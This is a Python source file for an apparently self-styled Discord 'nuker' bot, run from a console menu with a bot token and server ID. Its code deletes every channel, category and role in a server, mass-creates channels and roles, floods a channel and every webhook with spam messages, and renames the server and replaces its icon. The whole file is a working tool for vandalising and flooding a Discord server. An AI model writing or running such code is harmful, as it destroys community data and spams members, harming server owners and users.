import os
import sys
import threading
import logging
import asyncio
import aiohttp
from colorama import init, Fore, Style
import discord
from discord.ext import commands

init()
logging.getLogger('discord').setLevel(logging.WARNING)

bot_token = None
server_id = None
bot_instance = None
bot_ready_event = threading.Event()

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True
intents.voice_states = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    global bot_instance
    bot_instance = bot
    bot_ready_event.set()
    print("Bot successfully logged in.")

async def create_channels(guild_id, number, name):
    guild = bot_instance.get_guild(guild_id)
    if guild:
        for i in range(number):
            await guild.create_text_channel(f"{name}-{i}")
            print(f"Created channel {name}-{i}")

async def delete_all_channels(guild_id):
    guild = bot_instance.get_guild(guild_id)
    if guild:
        channels = guild.channels
        for channel in channels:
            if isinstance(channel, discord.TextChannel):
                await channel.delete()
                print(f"Deleted text channel {channel.name}")
        for channel in channels:
            if isinstance(channel, discord.VoiceChannel):
                await channel.delete()
                print(f"Deleted voice channel {channel.name}")
        categories = guild.categories
        for category in categories:
            for channel in category.channels:
                await channel.delete()
                print(f"Deleted channel {channel.name}")
            await category.delete()
            print(f"Deleted category {category.name}")

async def create_roles(guild_id, number, name, assign_to_everyone):
    guild = bot_instance.get_guild(guild_id)
    if guild:
        color = discord.Color.dark_red()
        roles = []
        assign_to_everyone = assign_to_everyone.lower() == 'yes'
        for i in range(number):
            role_name = f"{name}-{i}"
            role = await guild.create_role(name=role_name, color=color, mentionable=assign_to_everyone)
            roles.append(role)
            print(f"Created role {role_name}")
        if assign_to_everyone:
            everyone_role = discord.utils.get(guild.roles, name="@everyone")
            for role in roles:
                await role.edit(permissions=everyone_role.permissions)
                print(f"Assigned role {role.name} to everyone.")

async def delete_all_roles(guild_id):
    guild = bot_instance.get_guild(guild_id)
    if guild:
        roles = guild.roles
        for role in roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    print(f"Deleted role {role.name}")
                except discord.Forbidden:
                    print(f"Failed to delete role {role.name}: Forbidden")
                except discord.HTTPException as e:
                    print(f"Failed to delete role {role.name}: HTTP Exception {e}")

async def spam_messages(channel_id, message, count):
    channel = bot_instance.get_channel(channel_id)
    if channel and isinstance(channel, discord.TextChannel):
        for _ in range(count):
            try:
                await channel.send(message)
                print(f"Sent message to channel {channel_id}")
                await asyncio.sleep(0.1)
            except discord.Forbidden:
                print("Forbidden: Check if the bot has permission to send messages.")
                break
            except discord.HTTPException as e:
                print(f"HTTP Exception: {e}")
                break
            except Exception as e:
                print(f"An error occurred: {e}")
                break

async def create_webhooks(guild_id):
    guild = bot_instance.get_guild(guild_id)
    if guild:
        for channel in guild.text_channels:
            try:
                webhook = await channel.create_webhook(name=f"Webhook for {channel.name}")
                print(f"Created webhook in channel {channel.name} with URL: {webhook.url}")
            except discord.Forbidden:
                print(f"Failed to create webhook in channel {channel.name}: Forbidden")
            except discord.HTTPException as e:
                print(f"Failed to create webhook in channel {channel.name}: HTTP Exception {e}")

async def get_all_webhooks(guild_id):
    guild = bot_instance.get_guild(guild_id)
    if guild:
        all_webhooks = []
        for channel in guild.text_channels:
            try:
                webhooks = await channel.webhooks()
                all_webhooks.extend(webhooks)
            except discord.Forbidden:
                print(f"Failed to retrieve webhooks from channel {channel.name}: Forbidden")
            except discord.HTTPException as e:
                print(f"Failed to retrieve webhooks from channel {channel.name}: HTTP Exception {e}")
        return all_webhooks
    return []

async def spam_webhooks(guild_id, message, count):
    webhooks = await get_all_webhooks(guild_id)
    if webhooks:
        for _ in range(count):
            for webhook in webhooks:
                try:
                    await webhook.send(message)
                    print(f"Sent message to webhook {webhook.url}")
                    await asyncio.sleep(0.1)
                except discord.Forbidden:
                    print(f"Failed to send message to webhook {webhook.url}: Forbidden")
                except discord.HTTPException as e:
                    print(f"Failed to send message to webhook {webhook.url}: HTTP Exception {e}")
                except Exception as e:
                    print(f"An error occurred: {e}")
    else:
        print("No webhooks found to spam.")

async def change_server_name(guild_id, new_name):
    guild = bot_instance.get_guild(guild_id)
    if guild:
        try:
            await guild.edit(name=new_name)
            print(f"Server name changed to {new_name}")
        except discord.Forbidden:
            print("Failed to change server name: Forbidden")
        except discord.HTTPException as e:
            print(f"Failed to change server name: HTTP Exception {e}")

async def change_server_icon(guild_id, image_url):
    guild = bot_instance.get_guild(guild_id)
    if guild:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(image_url) as response:
                    if response.status == 200:
                        image_data = await response.read()
                        await guild.edit(icon=image_data)
                        print("Server profile picture updated.")
                    else:
                        print(f"Failed to download image: HTTP status {response.status}")
        except discord.Forbidden:
            print("Failed to change server profile picture: Forbidden")
        except discord.HTTPException as e:
            print(f"Failed to change server profile picture: HTTP Exception {e}")
        except Exception as e:
            print(f"An error occurred: {e}")

def process_choice(choice):
    global server_id
    try:
        if choice == 1:
            number = int(input("How many channels do you want to create? "))
            name = input("What is the name of the channels? ")
            asyncio.run_coroutine_threadsafe(create_channels(int(server_id), number, name), bot.loop).result()
        elif choice == 2:
            print("Deleting all channels, voice channels, and categories...")
            asyncio.run_coroutine_threadsafe(delete_all_channels(int(server_id)), bot.loop).result()
        elif choice == 3:
            number = int(input("How many roles do you want to create? "))
            name = input("What is the name of the roles? ")
            assign_to_everyone = input("Do you want to assign everyone these roles? (yes/no): ").strip()
            asyncio.run_coroutine_threadsafe(create_roles(int(server_id), number, name, assign_to_everyone), bot.loop).result()
        elif choice == 4:
            print("Deleting all roles...")
            asyncio.run_coroutine_threadsafe(delete_all_roles(int(server_id)), bot.loop).result()
        elif choice == 5:
            channel_id = int(input("What is the Channel ID to spam? "))
            message = input("What message do you want to spam? ")
            count = int(input("How many times do you want to send this message? "))
            asyncio.run_coroutine_threadsafe(spam_messages(channel_id, message, count), bot.loop).result()
        elif choice == 6:
            print("Creating webhooks in all text channels...")
            asyncio.run_coroutine_threadsafe(create_webhooks(int(server_id)), bot.loop).result()
        elif choice == 7:
            message = input("What message to spam to all webhooks? ")
            print("Spamming all webhooks...")
            asyncio.run_coroutine_threadsafe(spam_webhooks(int(server_id), message, 36), bot.loop).result()
        elif choice == 8:
            new_name = input("What do you want to change the server name to? ")
            asyncio.run_coroutine_threadsafe(change_server_name(int(server_id), new_name), bot.loop).result()
        elif choice == 9:
            image_url = input("Image URL to change to server profile: ")
            asyncio.run_coroutine_threadsafe(change_server_icon(int(server_id), image_url), bot.loop).result()
        else:
            raise ValueError("Invalid choice")
    except ValueError:
        print("Invalid input, try again.")
    except Exception as e:
        print(f"An error occurred: {e}")

    asyncio.run(asyncio.sleep(3))
    os.system('cls' if os.name == 'nt' else 'clear')
    display_menu()

def menu_process():
    bot_thread = threading.Thread(target=lambda: bot.run(bot_token))
    bot_thread.start()
    bot_ready_event.wait()
    
    while True:
        display_menu()
        try:
            choice = int(input("Enter your choice: "))
            process_choice(choice)
        except ValueError:
            print("Invalid input, please enter a number.")
            asyncio.run(asyncio.sleep(3))
            os.system('cls' if os.name == 'nt' else 'clear')

def display_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.BLUE + Style.BRIGHT + """
    ███████╗ █████╗ ███████╗███████╗███╗   ██╗██╗██╗   ██╗███╗   ███╗
    ██╔════╝██╔══██╗██╔════╝██╔════╝████╗  ██║██║██║   ██║████╗ ████║
    █████╗  ███████║███████╗█████╗  ██╔██╗ ██║██║██║   ██║██╔████╔██║
    ██╔══╝  ██╔══██║╚════██║██╔══╝  ██║╚██╗██║██║╚██╗ ██╔╝██║╚██╔╝██║
    ██║     ██║  ██║███████║███████╗██║ ╚████║██║ ╚████╔╝ ██║ ╚═╝ ██║
    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═══╝  ╚═╝     ╚═╝
    
    ┌────────────────────────────────────┐
    │ [1] Create Channels                │
    │ [2] Delete Channels                │
    │ [3] Create Roles                   │
    │ [4] Delete Roles                   │
    │ [5] Spam Messages                  │
    │ [6] Create Webhooks                │
    │ [7] Spam Webhooks                  │
    │ [8] Change Server Name             │
    │ [9] Change Server Profile Picture  │
    │ [10] End Server                    │
    └────────────────────────────────────┘
    """ + Style.RESET_ALL)

def main():
    global bot_token, server_id
    bot_token = input("Enter your bot token: ").strip()
    if not bot_token:
        print("Bot token cannot be empty")
        return
    server_id = input("Enter server ID to use: ").strip()
    if not server_id:
        print("Server ID cannot be empty")
        return
    menu_process()

if __name__ == "__main__":
    main()
